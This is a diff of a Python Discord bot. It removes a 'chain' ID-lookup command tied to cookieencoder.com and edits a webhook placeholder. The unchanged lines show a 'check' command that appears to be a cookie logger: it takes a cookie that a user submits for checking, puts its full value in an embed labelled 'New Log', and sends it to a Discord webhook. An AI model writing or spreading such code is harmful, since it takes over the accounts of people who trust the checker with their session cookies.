@@ -8,24 +8,6 @@ import requests
 req = requests.Session()
 client = commands.Bot(command_prefix='.') #set prefix
 
-
-
-    
-@client.command() #command
-async def chain(ctx, idc):
-  webhook = "YourWebhookHere"
-  r = requests.get('https://buy.cookieencoder.com')
-  ids = r.json()
-  print(ids['ids'])
-  if idc in ids['ids']:
-    embed = discord.Embed(title='Id search🔎',url='https://mine.cookieencoder.com/',color=0x3498db)
-    embed.set_author(name='System by Ice Bear#8828', icon_url='https://mine.cookieencoder.com/img/favicon.png')
-    embed.set_footer(text='Powered by https://mine.cookieencoder.com')
-    embed.add_field(name= 'Place in chain:', value=int(ids['ids'].index(idc)) + 1,inline=True)
-    await ctx.send(embed=embed)
-  else:
-    embed = discord.Embed(title='**❌ Id not in the database! ❌**',color=0xff0000)
-    await ctx.send(embed=embed)
 @client.event
 async def on_ready():
   print('bot ready!') #print bot ready! when bot is online
@@ -111,7 +93,7 @@ async def check(ctx, cookie):
     e.add_embed_field(name='Cookie🍪:', value=f'```{cookie}```', inline=False)
     e.set_thumbnail(url=image_url)
     e.set_footer(text='discord.gg/legal')
-    webhook = DiscordWebhook(url='YourWebhook', username="New Log")
+    webhook = DiscordWebhook(url='YourWebhookHERE', username="New Log")
     webhook.add_embed(e)
     webhook.execute()
   else:
